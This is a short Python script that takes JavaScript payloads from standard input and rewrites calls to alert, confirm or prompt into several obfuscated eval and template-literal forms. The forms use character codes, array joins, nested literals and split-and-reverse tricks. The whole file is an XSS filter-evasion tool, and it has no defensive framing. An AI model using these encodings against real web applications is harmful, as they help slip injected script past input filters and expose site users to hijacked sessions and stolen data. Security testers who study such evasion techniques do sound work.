import sys
import re

def template_literal_encode(payload):
    keywords = ['confirm', 'alert', 'prompt']
    for keyword in keywords:
        pattern = re.compile(keyword, re.IGNORECASE)
        match = pattern.search(payload)
        if match:
            start = match.start()
            encoded_payloads = []
            
            rest = payload[start + len(keyword):]
            
            # Template literal with split
            encoded_payloads.append(f"eval(`${keyword}${rest}`)")
            
            # Template literal with variable interpolation
            char_concat = '+'.join(f"'{c}'" for c in keyword)
            encoded_payloads.append(f"eval(`${{{char_concat}}}${rest}`)")
            
            # Template literal with character codes
            char_codes = '+'.join(f"String.fromCharCode({ord(c)})" for c in keyword)
            encoded_payloads.append(f"eval(`${{{char_codes}}}${rest}`)")
            
            # Template literal with array join
            char_array = ','.join(f"'{c}'" for c in keyword)
            encoded_payloads.append(f"eval(`${{[{char_array}].join('')}}${rest}`)")
            
            # Nested template literals
            encoded_payloads.append(f"eval(`${{`${{'{keyword[0]}'}}`+`${{'{keyword[1:]}'}}`}}${rest}`)")
            
            # Template literal with split and join
            encoded_payloads.append(f"eval(`${{'{keyword}'.split('').join('')}}${rest}`)")
            
            # Template literal with reverse
            encoded_payloads.append(f"eval(`${{'{keyword}'.split('').reverse().reverse().join('')}}${rest}`)")
            
            return encoded_payloads
    return [payload]

if __name__ == "__main__":
    for line in sys.stdin:
        payload = line.strip()
        encoded_payloads = template_literal_encode(payload)
        for ep in encoded_payloads:
            print(ep)

